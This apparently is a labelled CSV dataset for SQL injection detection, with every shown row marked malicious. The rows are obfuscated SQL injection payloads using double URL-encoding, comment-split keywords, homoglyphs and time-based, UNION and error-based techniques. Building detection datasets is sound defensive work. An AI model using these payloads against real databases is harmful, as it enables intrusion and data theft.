Query,Label
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’   )    )    аnd 3355  =  6012 аnd    (    (   ’ofmy’  =  ’ofmy’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-7579%2525%2522%2520or%25206570%2520%2520%253D%2520%25201764') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--elt%2520%2520%2528%2520%25202567%2520%2520%253D%2520%25209921%252C9921%2520%2520%2529%2520%2520,1
SE/**/LECT * FR/**/OM (SE/**/LECT '-8086%’  )   o/**/r 4493  =  utl_inаddr.get_host_аddress  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  cаse when   (  4493  =  4493  )   then 1 else 0 end  )   fr/**/om duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    аnd   (  ’%’  =  ’') AS benign_sub,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%25202633%2520%2520%253D%2520%2520dbms_pipe.receive_message%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520103%2520%2520%2529%2520%2520%252C5%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)---9562’ o/**/r 8571  =  8571--",1
"IF(1=1, SLEEP(5), 0)--1%2527%252B%2520%2520%2528%2520%2520se/**/lect%2520nvht%2520w/**/here%25209118%2520%2520%253D%2520%25209118%2520o/**/r%25208315%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/**/om%2520sysibm.systables%2520as%2520t1%252Csysibm.systables%2520as%2520t2%252Csysibm.systables%2520as%2520t3%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252B%2527",1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2525%2522%2520a/**/nd%2520%2520%2520%2528%2520%25202850%2520%2520%253D%2520%25206610%2520%2520%2529%2520%2520%252A6610%2520a/**/nd%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-3982%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25206872%2520%2520%253D%2520%25206872%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%25206331%2520%2520%253D%2520%25206331%2527%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '1%2525%2527%2520%2520%2529%2520%2520%2520union%2520аll%2520select%2520null%252Cnull%252Cnull%252Cnull%252Cnull%252Cnull--') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1   )    )     )   rlike   (  se/**/lect * fr/**/om   (  se/**/lect  (  sleep  (  5   )    )     )  sgvo  )   a/**/nd    (    (     (  4574  =  4574') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1""  )   аs jngl w/**/here 8384  =  8384 аnd 4580  =  1718--",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520w/%252A%252A/here%25209072%2520%2520%253D%2520%25209072%2520a/%252A%252A/nd%2520elt%2520%2520%2528%2520%25204249%2520%2520%253D%2520%25204249%252C7259%2520%2520%2529%2520%2520--,1
SELECT * FRΟM (SELECT ’1%2525%2527%2520%2520%2529%2520%2520%2520or%25208421%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520generаte_series%2520%2520%2528%2520%25201%252C5000000%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520аnd%2520%2520%2520%2528%2520%2520%2527%2525%2527%2520%2520%253D%2520%2520%2527’) AS benign_sub,1
SE/**/LECT * FR/**/ΟM (SE/**/LECT ’1  )   rlike   (  se/**/lect   (  cаse when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    а/**/nd   (  1073  =  1073’) AS benign_sub,1
SE/**/LECT * FR/**/OM (SE/**/LECT '1%2527%257C%257C%2520%2520%2528%2520%2520se/**/lect%2520%2527rdqv%2527%2520fr/**/om%2520dual%2520w/**/here%25201894%2520%2520%253D%2520%25201894') AS benign_sub,1
SE/%252A%252A/LECT%2520%252A%2520FR/%252A%252A/OM%2520%2528SE/%252A%252A/LECT%2520%2527-6202%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520o/%252A%252A/r%25207845%2520%2520%253D%2520%25201962--%2527%2529%2520AS%2520benign_sub,1
"SELECT * FRΟM (SELECT ’1 w/**/here 4468  =  4468 o/**/r chаr  (  75  )  ||chаr  (  70  )  ||chаr  (  99  )  ||chаr  (  83  )    =  regexp_substring  (  repeаt  (  left  (  crypt_key  (  chаr  (  65  )  ||chаr  (  69  )  ||chаr  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --’) AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520%25D0%25B0ll_users%2520t1%252C%25D0%25B0ll_users%2520t2%252C%25D0%25B0ll_users%2520t3%252C%25D0%25B0ll_users%2520t4%252C%25D0%25B0ll_users%2520t5%2520%25D0%25B0nd%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
"SELECT * FROM (SELECT '-2340%"" o/**/rder by 1#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’||  (  se/**/lect ’gtri’ fr/**/om duаl w/**/here 7097  =  7097 аnd elt  (  1210  =  1210,sleep  (  5   )    )     )  ||’",1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520select%2520%252A%2520from%2520%2520%2520%2528%2520%2520select%2520%2520%2528%2520%2520sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520fzno%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2528%2520%2520%2527mqoj%2527%2520like%2520%2527mqoj') AS benign_sub,1
1%2520%2520%2529%2520%2520%2520w/**/here%25204992%2520%2520%253D%2520%25204992,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---4093'   )    )    un/**/ion all se/**/lect 5785,5785,5785#') AS benign_sub",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%25E2%2580%2599%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520upd%25D0%25B0texml%2520%2520%2528%2520%25203393%252Cconc%25D0%25B0t%2520%2520%2528%2520%25200x2e%252C0x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25203393%2520%2520%253D%2520%25203393%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%2520%2520%2529%2520%2520%252C1161%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2528%2520%2520%25E2%2580%2599ngxz%25E2%2580%2599%2520%2520%253D%2520%2520%25E2%2580%2599ngxz%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)---8181%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%25205926%2520%2520%253D%2520%25203332%2523",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1%2527%2520%2520%2529%2520%2520%2520as%2520pghp%2520where%25209086%2520%2520%253D%2520%25209086') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%""   )    )    a/**/nd   (  7817  =  4371  )  *4371 a/**/nd    (    (   ""%""  =  ""') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1,  (  convert  (  int,  (  select chаr  (  113  )  +chаr  (  113  )  +chаr  (  112  )  +chаr  (  106  )  +chаr  (  113  )  +  (  select   (  cаse when   (  4932  =  4932  )   then chаr  (  49  )   else chаr  (  48  )   end   )    )   +chаr  (  113  )  +chаr  (  122  )  +chаr  (  118  )  +chаr  (  122  )  +chаr  (  113   )    )      )    )   ') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520eveb%2520w/**/here%25207567%2520%2520%253D%2520%25207567",1
SE/**/LECT%2520%252A%2520FR/**/OM%2520%2528SE/**/LECT%2520%25271%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520o/**/r%25204240%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/**/lect%25204240%2520fr/**/om%2520pg_sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)---3902’   )    )     )   un/**/ion аll se/**/lect 3999,3999,3999,3999,3999,3999,3999,3999,3999#",1
SELECT * FROM (SELECT 'IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520procedure%2520analyse%2520%2520%2528%2520%2520extractvalue%2520%2520%2528%2520%25205840%252Cconcat%2520%2520%2528%2520%25200x5c%252C0x7171706a71%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25205840%2520%2520%253D%2520%25205840%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C0x717a767a71%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%252C1%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2527gfll%2527%2520%2520%253D%2520%2520%2527gfll') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%2527%2520%2520%2529%2520%2520%2520or%25207552%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520from%2520rdb%2524fields%2520аs%2520t1%252Crdb%2524types%2520аs%2520t2%252Crdb%2524collаtions%2520аs%2520t3%252Crdb%2524functions%2520аs%2520t4%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2528%2520%2520%2527jhxh%2527%2520%2520%253D%2520%2520%2527jhxh",1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-9684%2522%2520order%2520by%25201%2523%2527%2529%2520AS%2520benign_sub",1
"IF(1=1, SLEEP(5), 0)--se/**/lect benchmаrk  (  5000000,md5  (  0x4c4d6142   )    )    аnd   (  ""poik""  =  ""poik",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-1579%’   )    )     )   union аll select 7272#') AS benign_sub",1
SELECT * FROM (SELECT '1%2527%2520in%2520booleаn%2520mode%2520%2520%2529%2520%2520%2520аnd%25209198%2520%2520%253D%2520%25209198--') AS benign_sub,1
1%2522%2520%2520%2529%2520%2520%2520%25D0%25B0s%2520piwi%2520w/%252A%252A/here%25202918%2520%2520%253D%2520%25202918,1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520elt%2520%2520%2528%2520%25204249%2520%2520%253D%2520%25204249%252C7259%2520%2520%2529%2520%2520%2520%25D0%25B0nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529---8869%2522%2520where%25203019%2520%2520%253D%2520%25203019%2520union%2520%25D0%25B0ll%2520select%25203019%252C3019%252C3019%2523,1
SELECT * FROM (SELECT '1%2520%2520%2529%2520%2520%2520where%25204653%2520%2520%253D%2520%25204653%2520or%25206793%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520select%25206793%2520from%2520pg_sleep%2520%2520%2528%2520%25205%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520--') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)---4876%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520saug%2520where%25202256%2520%2520%253D%2520%25202256%2520union%2520all%2520select%25202256%252C2256%252C2256%252C2256%252C2256%252C2256%252C2256%252C2256%252C2256%252C2256--') AS benign_sub",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520and%25202853%2520%2520%253D%2520%2520cast%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520112%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520106%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%257C%257C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520case%2520when%2520%2520%2520%2528%2520%25202853%2520%2520%253D%2520%25202853%2520%2520%2529%2520%2520%2520then%25201%2520else%25200%2520end%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%253A%253Atext%257C%257C%2520%2520%2528%2520%2520chr%2520%2520%2528%2520%2520113%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520118%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520122%2520%2520%2529%2520%2520%257C%257Cchr%2520%2520%2528%2520%2520113%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520numeric%2520%2520%2529%2520%2520%2520and%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522%2525%2522%2520%2520%253D%2520%2520%2522%2527%2529%2520AS%2520benign_sub,1
SELECT * FROM (SELECT '1%2520or%2520ch%25D0%25B0r%2520%2520%2528%2520%252075%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252070%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252099%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repe%25D0%25B0t%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520ch%25D0%25B0r%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cch%25D0%25B0r%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520--') AS benign_sub,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1%'   )    )    a/**/nd elt  (  4483  =  5364,5364  )   a/**/nd    (    (   '%'  =  '') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)---7271%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%2520mаke_set%2520%2520%2528%2520%25209354%2520%2520%253D%2520%25209354%252C7185%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2520%2520%2528%2520%2520%2527mdtw%2527%2520%2520%253D%2520%2520%2527mdtw",1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520efjb%2520w/%252A%252A/here%25204642%2520%2520%253D%2520%25204642%2520o/%252A%252A/rder%2520by%25201%2523,1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527-8677%2527%257C%257C%2520%2520%2528%2520%2520select%2520%2527ihpm%2527%2520from%2520dual%2520where%25209571%2520%2520%253D%2520%25209571%2520union%2520all%2520select%25209571%252C9571%252C9571%252C9571%252C9571%252C9571%252C9571%252C9571%252C9571%252C9571--%2527%2529%2520AS%2520benign_sub",1
"IF(1=1, SLEEP(5), 0)--1’  )   w/**/here 2840  =  2840",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2527%257C%257C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2527yyil%2527%2520fr/%252A%252A/om%2520dual%2520w/%252A%252A/here%25203121%2520%2520%253D%2520%25203121%2527%2529%2520AS%2520benign_sub,1
"IF(1=1, SLEEP(5), 0)--1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520or%2520%2520%2520%2528%2520%2520select%25209173%2520from%2520%2520%2528%2520%2520select%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%252Cconcаt%2520%2520%2528%2520%25200x7171706а71%252C%2520%2520%2528%2520%2520select%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25209173%2520%2520%253D%2520%25209173%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717а767а71%252Cfloor%2520%2520%2528%2520%2520rаnd%2520%2520%2528%2520%25200%2520%2520%2529%2520%2520%252A2%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520from%2520informаtion_schemа.chаrаcter_sets%2520group%2520by%2520x%2520%2520%2529%2520%2520а%2520%2520%2529%2520%2520%2520аnd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%25205137%2520%2520%253D%2520%25205137",1
SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%2527IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2525%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%2520or%2520char%2520%2520%2528%2520%252075%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252070%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252099%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%2520%2520%253D%2520%2520regexp_substring%2520%2520%2528%2520%2520repeat%2520%2520%2528%2520%2520left%2520%2520%2528%2520%2520crypt_key%2520%2520%2528%2520%2520char%2520%2520%2528%2520%252065%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252069%2520%2520%2529%2520%2520%257C%257Cchar%2520%2520%2528%2520%252083%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520%252C0%2520%2520%2529%2520%2520%252C500000000%2520%2520%2529%2520%2520%252Cnull%2520%2520%2529%2520%2520--%2527%2529%2520AS%2520benign_sub,1
1%2522%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0/%252A%252A/nd%2520exp%2520%2520%2528%2520%2520~%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%252A%2520fr/%252A%252A/om%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520conc%25D0%25B0t%2520%2520%2528%2520%25200x7171706%25D0%25B071%252C%2520%2520%2528%2520%2520se/%252A%252A/lect%2520%2520%2520%2528%2520%2520elt%2520%2520%2528%2520%25208190%2520%2520%253D%2520%25208190%252C1%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%2520%2529%2520%2520%252C0x717%25D0%25B0767%25D0%25B071%252C0x78%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520x%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520%25D0%25B0/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2522kvpy%2522%2520%2520%253D%2520%2520%2522kvpy,1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '-4932%""   )    )    o/**/r   (  3076  =  5927  )  *5927 a/**/nd    (    (   ""%""  =  ""') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’ or chаr  (  117  )  ||chаr  (  111  )  ||chаr  (  105  )  ||chаr  (  100  )    =  regexp_substring  (  repeаt  (  left  (  crypt_key  (  chаr  (  65  )  ||chаr  (  69  )  ||chаr  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   аnd ’nelb’  =  ’nelb’) AS benign_sub",1
"SE/**/LECT * FR/**/OM (SE/**/LECT 'IF(1=1, SLEEP(5), 0)--1'||  (  se/**/lect 'vdeo' w/**/here 4355  =  4355') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FRΟM (SELECT ’1’ in booleаn mode  )   аnd 3787  =  7750--’) AS benign_sub",1
"SELECT * FROM (SELECT '-2790%""  )   un/**/ion аll se/**/lect 5070,5070#') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SE/**/LECT * FR/**/OM (SE/**/LECT '1'||  (  se/**/lect 'vpuh' w/**/here 8164  =  8164') AS benign_sub",1
SELECT * FROM (SELECT '-5062  )   w/**/here 7457  =  7457 o/**/r 4144  =    (  se/**/lect upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  se/**/lect   (  cаse when   (  4144  =  4144  )   then 1 else 0 end  )   fr/**/om duаl  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   fr/**/om duаl  )  --') AS benign_sub,1
IF%25281%253D1%252C%2520SLEEP%25285%2529%252C%25200%2529--1%2527%2520%2520%2529%2520%2520%2520a/%252A%252A/nd%25202564%2520%2520%253D%2520%25203234--,1
SELECT * FROM (SELECT '1%2522%2520%2520%2529%2520%2520%2520as%2520firv%2520w/%252A%252A/here%25204522%2520%2520%253D%2520%25204522%2520o/%252A%252A/r%25202367%2520%2520%253D%2520%2520%2520%2520%2528%2520%2520se/%252A%252A/lect%2520count%2520%2520%2528%2520%2520%252A%2520%2520%2529%2520%2520%2520fr/%252A%252A/om%2520rdb%2524fields%2520as%2520t1%252Crdb%2524types%2520as%2520t2%252Crdb%2524collations%2520as%2520t3%252Crdb%2524functions%2520as%2520t4%2520%2520%2529%2520%2520--') AS benign_sub,1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--1’||  (  select ’lkmh’ where 7659  =  7659') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT * FROM (SELECT '1'  )   w/**/here 3476  =  3476 a/**/nd elt  (  1210  =  1210,sleep  (  5   )    )   --') AS benign_sub",1
"SELECT * FROM (SELECT 'IF(1=1, SLEEP(5), 0)--se/**/lect dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   fr/**/om dual a/**/nd    (    (   'quqx'  =  'quqx') AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--SELECT%2520%252A%2520FROM%2520%2528SELECT%2520%25271%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520as%2520kgfp%2520where%25202366%2520%2520%253D%2520%25202366%2527%2529%2520AS%2520benign_sub",1
"IF(1=1, SLEEP(5), 0)---3952’  )   un/**/ion аll se/**/lect 6644,6644,6644--",1
"SE/**/LECT * FRΟM (SE/**/LECT ’1’  )   o/**/r 7552  =    (  se/**/lect count  (  *  )   fr/**/om rdb$fields аs t1,rdb$types аs t2,rdb$collаtions аs t3,rdb$functions аs t4  )   аnd   (  ’khаh’ like ’khаh’) AS benign_sub",1
"IF(1=1, SLEEP(5), 0)--1%2527%2520%2520%2520%2529%2520%2520%2520%2520%2529%2520%2520%2520%2520a/%252A%252A/nd%2520make_set%2520%2520%2528%2520%25208403%2520%2520%253D%2520%25208403%252C8899%2520%2520%2529%2520%2520%2520a/%252A%252A/nd%2520%2520%2520%2520%2528%2520%2520%2520%2520%2528%2520%2520%2520%2527lokx%2527%2520like%2520%2527lokx",1
